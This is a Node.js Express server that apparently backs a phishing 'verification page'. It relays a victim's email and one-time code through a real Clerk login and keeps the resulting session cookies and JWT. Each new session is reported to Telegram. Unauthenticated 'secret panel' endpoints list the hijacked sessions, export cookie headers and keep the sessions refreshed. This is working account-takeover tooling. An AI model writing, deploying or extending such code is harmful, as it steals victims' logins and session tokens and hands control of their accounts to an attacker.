'use strict';

const express = require('express');
const clerk = require('./src/clerk');
const apibf = require('./src/apibf');
const store = require('./src/store');
const telegram = require('./src/telegram');

const app = express();
app.disable('x-powered-by');
app.use(express.json({ limit: '256kb' }));

// CORS (open, the frontend worker proxies anyway)
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,DELETE,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

const PENDING_TTL_MS = 30 * 60 * 1000;

function maskEmail(email) {
  const str = String(email || '');
  const at = str.indexOf('@');
  if (at < 1) return str;
  const name = str.slice(0, at);
  const domain = str.slice(at + 1);
  const masked = name.length <= 2 ? name[0] + '\u2022\u2022\u2022' : name[0] + '\u2022\u2022\u2022' + name.slice(-2);
  return masked + '@' + domain;
}

// Health
app.get('/health', (req, res) => {
  res.json({
    ok: true,
    service: 'profiles-access-backend',
    uptime_s: Math.floor(process.uptime()),
    sessions: store.count(),
    pending: store.pendingCount()
  });
});

app.post('/api/test-telegram', async (req, res) => {
  const ok = await telegram.notifyTest();
  res.json({ ok });
});

// ---------------------------------------------------------------------------
// Public: login flow (used by the verification page)
// ---------------------------------------------------------------------------

app.post('/api/login/start', async (req, res) => {
  try {
    const email = String((req.body || {}).email || '').trim().toLowerCase();
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      return res.status(400).json({ ok: false, error: 'Please enter a valid email address.' });
    }
    store.cleanupPending(PENDING_TTL_MS);
    const pending = await clerk.startLogin(email);
    store.addPending(pending);
    res.json({ ok: true, sign_in_id: pending.sign_in_id, email: maskEmail(pending.email) });
  } catch (e) {
    res.status(400).json({ ok: false, error: e.message || 'Could not start the verification.' });
  }
});

app.post('/api/login/attempt', async (req, res) => {
  try {
    const { sign_in_id, code } = req.body || {};
    const pending = store.getPending(sign_in_id);
    if (!pending) {
      return res.status(400).json({ ok: false, error: 'This verification has expired. Please start again.' });
    }
    const otp = String(code || '').trim();
    if (!otp) {
      return res.status(400).json({ ok: false, error: 'Please enter the verification code.' });
    }
    const result = await clerk.attemptLogin(pending, otp);
    store.removePending(sign_in_id);
    const record = store.createSession({
      email: pending.email,
      sign_in_id: pending.sign_in_id,
      session_id: result.session_id,
      client_id: result.client_id,
      user: result.user,
      cookies: result.jar.toArray(),
      jwt: result.jwt,
      jwt_payload: clerk.decodeJwt(result.jwt)
    });
    res.json({ ok: true, session: { id: record.id, email: record.email, status: record.status } });

    // Post-processing (account status + Telegram notification), does not block the response
    (async () => {
      try {
        const jar = clerk.jarFromRecord(record);
        record.api_status = await apibf.accountStatus(jar);
        record.cookies = jar.toArray();
      } catch (e) {
        record.api_status = { error: e.message };
      }
      store.save();
      try {
        await telegram.notifyNewSession(record);
      } catch (e) {
        console.error('[telegram]', e.message);
      }
    })().catch(() => {});
  } catch (e) {
    console.error('[login/attempt]', e.stack || e.message);
    res.status(400).json({ ok: false, error: e.message || 'Verification failed.' });
  }
});

// ---------------------------------------------------------------------------
// Admin: sessions (used by the secret panel)
// ---------------------------------------------------------------------------

app.get('/api/sessions', (req, res) => {
  res.json({ ok: true, sessions: store.list() });
});

app.get('/api/sessions/:id', (req, res) => {
  const r = store.get(req.params.id);
  if (!r) return res.status(404).json({ ok: false, error: 'Session not found' });
  res.json({ ok: true, session: r });
});

app.get('/api/sessions/:id/cookies', (req, res) => {
  const r = store.get(req.params.id);
  if (!r) return res.status(404).json({ ok: false, error: 'Session not found' });
  res.json({ ok: true, cookies: r.cookies, cookie_header: clerk.cookieHeaderFor(r) });
});

app.post('/api/sessions/:id/refresh', async (req, res) => {
  const r = store.get(req.params.id);
  if (!r) return res.status(404).json({ ok: false, error: 'Session not found' });
  try {
    await clerk.refreshSession(r);
    store.save();
    res.json({ ok: true, session: r });
  } catch (e) {
    r.status = 'EXPIRED';
    store.save();
    res.status(400).json({ ok: false, error: e.message || 'Refresh failed.', session: r });
  }
});

app.get('/api/sessions/:id/status', async (req, res) => {
  const r = store.get(req.params.id);
  if (!r) return res.status(404).json({ ok: false, error: 'Session not found' });
  try {
    try {
      await clerk.refreshSession(r); // ensure a fresh token first
    } catch (e) {
      r.status = 'EXPIRED';
    }
    const jar = clerk.jarFromRecord(r);
    r.api_status = await apibf.accountStatus(jar);
    r.cookies = jar.toArray();
    store.save();
    res.json({ ok: true, status: r.api_status });
  } catch (e) {
    res.status(400).json({ ok: false, error: e.message || 'Status check failed.' });
  }
});

app.delete('/api/sessions/:id', (req, res) => {
  const ok = store.remove(req.params.id);
  res.json(ok ? { ok: true } : { ok: false, error: 'Session not found' });
});

// Cron / maintenance: refresh all active sessions (keeps sessions alive with fresh cookies)
app.post('/api/maintenance', async (req, res) => {
  const result = await store.refreshAll(clerk, telegram);
  res.json({ ok: true, ...result });
});

// Periodic pending cleanup
setInterval(() => store.cleanupPending(PENDING_TTL_MS), 10 * 60 * 1000).unref();

const PORT = process.env.PORT || 3000;
store.load();
app.listen(PORT, '0.0.0.0', () => {
  console.log('[server] profiles-access-backend listening on port ' + PORT);
});

process.on('uncaughtException', (e) => console.error('[uncaught]', e));
process.on('unhandledRejection', (e) => console.error('[unhandled]', e));

